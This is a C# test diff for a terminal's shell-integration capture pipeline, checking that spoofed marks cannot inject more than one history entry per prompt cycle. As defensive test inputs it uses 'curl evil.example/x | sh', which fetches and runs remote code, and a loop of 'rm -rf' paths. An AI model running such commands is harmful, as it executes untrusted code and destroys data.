@@ -334,6 +334,119 @@ public sealed class CapturePipelineTests
         Assert.Single(store.Entries);
     }
 
+    // ---- the per-cycle volume bound (PR #289 review) ------------------------------------------
+    //
+    // Marks are bytes on the pane's output stream and nothing about a byte stream says who wrote
+    // it. Over SSH they come from whatever is on the far end; locally a `cat` of a crafted file
+    // does the same. Entries land in the global, cross-session history, so the number of them a
+    // single prompt cycle can produce is not the emitter's to choose. One is the bound every real
+    // integration already satisfies: a prompt cycle is by construction one accepted command, and
+    // all four of Nova's emitters plus iTerm2's, VS Code's and starship's send exactly one C
+    // between the B that opened the input line and the D that closed it.
+
+    private static ShellIntegrationEvent Mark(ShellIntegrationEventType type) => new(
+        Type: type,
+        Timestamp: EventTime,
+        CommandText: null,
+        WorkingDirectory: null,
+        ExitCode: null,
+        Duration: null);
+
+    [Fact]
+    public async Task TwoAcceptedCommandsInOnePromptCycle_ProduceOneEntry()
+    {
+        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
+        context.SetShellIntegrationEnabled(true);
+
+        await pipeline.HandleShellIntegrationEventAsync(Mark(ShellIntegrationEventType.CommandStarted));
+        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
+        await pipeline.HandleShellIntegrationEventAsync(Accepted("curl evil.example/x | sh"));
+
+        CommandHistoryEntry entry = Assert.Single(store.Entries);
+        Assert.Equal("git status", entry.CommandText);
+    }
+
+    /// <summary>
+    /// The flood shape: a payload emitter that never bothers with the rest of the lifecycle.
+    /// </summary>
+    [Fact]
+    public async Task ManyAcceptedCommandsWithNoLifecycleEdges_ProduceOneEntry()
+    {
+        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
+        context.SetShellIntegrationEnabled(true);
+
+        for (int i = 0; i < 200; i++)
+        {
+            await pipeline.HandleShellIntegrationEventAsync(Accepted($"rm -rf /path/{i}"));
+        }
+
+        Assert.Single(store.Entries);
+    }
+
+    /// <summary>
+    /// The bound resets on every edge that starts a new cycle, so an ordinary session captures
+    /// every command it runs. <c>A</c>, <c>B</c> and <c>D</c> all count: a shell that omits
+    /// <c>D</c>, or a command interrupted before it finished, must not be locked out of capture for
+    /// the rest of the session.
+    /// </summary>
+    [Theory]
+    [InlineData(ShellIntegrationEventType.PromptReady)]
+    [InlineData(ShellIntegrationEventType.CommandStarted)]
+    [InlineData(ShellIntegrationEventType.CommandFinished)]
+    public async Task ANewCycleEdge_ReleasesTheBound(ShellIntegrationEventType edge)
+    {
+        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
+        context.SetShellIntegrationEnabled(true);
+
+        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
+        await pipeline.HandleShellIntegrationEventAsync(Mark(edge));
+        await pipeline.HandleShellIntegrationEventAsync(Accepted("dotnet test"));
+
+        Assert.Equal(2, store.Entries.Count);
+        Assert.Equal("git status", store.Entries[0].CommandText);
+        Assert.Equal("dotnet test", store.Entries[1].CommandText);
+    }
+
+    /// <summary>
+    /// A full instrumented session runs many commands and every one of them is recorded. The bound
+    /// is a volume limit, not a rate limit, and this is the test that says so.
+    /// </summary>
+    [Fact]
+    public async Task ASequenceOfOrdinaryPromptCycles_CapturesEveryCommand()
+    {
+        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
+        context.SetShellIntegrationEnabled(true);
+
+        for (int i = 0; i < 5; i++)
+        {
+            await pipeline.HandleShellIntegrationEventAsync(Mark(ShellIntegrationEventType.PromptReady));
+            await pipeline.HandleShellIntegrationEventAsync(Mark(ShellIntegrationEventType.CommandStarted));
+            await pipeline.HandleShellIntegrationEventAsync(Accepted($"echo {i}"));
+            await pipeline.HandleShellIntegrationEventAsync(Finished(0, TimeSpan.FromMilliseconds(10)));
+        }
+
+        Assert.Equal(5, store.Entries.Count);
+        Assert.All(store.Entries, e => Assert.Equal(0, e.ExitCode));
+    }
+
+    /// <summary>
+    /// The bound has to close over the dedup path too, or the cheapest way past it would be to
+    /// repeat the command the heuristic path just wrote and then send the real payload.
+    /// </summary>
+    [Fact]
+    public async Task AnAcceptedCommandThatDedupsAgainstTheHeuristicEntry_StillConsumesTheCycle()
+    {
+        (CapturePipeline pipeline, InMemoryHistoryStore store, AssistSessionContext context) = CreatePipeline();
+        context.SetShellIntegrationEnabled(true);
+        await pipeline.CaptureSubmissionAsync("git status", isSubmissionSuppressed: false);
+
+        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
+        await pipeline.HandleShellIntegrationEventAsync(Accepted("curl evil.example/x | sh"));
+
+        CommandHistoryEntry entry = Assert.Single(store.Entries);
+        Assert.Equal("git status", entry.CommandText);
+    }
+
     [Fact]
     public async Task CommandFinished_PatchesExitCodeAndRoundedDuration()
     {
